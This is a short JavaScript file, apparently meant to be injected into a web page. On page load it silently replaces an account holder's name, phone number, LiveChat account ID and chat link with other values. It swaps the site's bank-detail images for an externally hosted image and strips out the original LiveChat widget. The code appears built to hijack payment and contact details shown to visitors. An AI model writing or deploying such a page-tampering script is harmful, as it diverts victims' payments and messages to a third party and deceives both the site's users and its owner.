document.addEventListener("DOMContentLoaded", function () {
    // Lakukan penggantian isi body HTML
    document.body.innerHTML = document.body.innerHTML
        .replace(/ONGKI ANDRIAN/g, 'Surwati')
        .replace(/0895410800347/g, '088214538915')
        .replace(/19199530/g, '19188360')
        .replace(/https:\/\/direct\.lc\.chat\/19199530\/?/g, 'https://direct.lc.chat/19188360/')
        .replace(/src=["']?\.\.\/uploads\/bank\/[^"']*["']?/g, 'src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg"');

    // Hapus widget LiveChat yang muncul dari script
    const interval = setInterval(() => {
        document.querySelectorAll('iframe, div, script').forEach(el => {
            const html = el.outerHTML || "";
            if (
                el.src?.includes("livechat") ||
                el.src?.includes("lc.chat") ||
                html.includes("LiveChatWidget") ||
                html.includes("livechatinc") ||
                el.id?.toLowerCase().includes("livechat")
            ) {
                el.remove();
            }
        });
    }, 500);

    // Stop pembersihan setelah 5 detik
    setTimeout(() => clearInterval(interval), 5000);
});
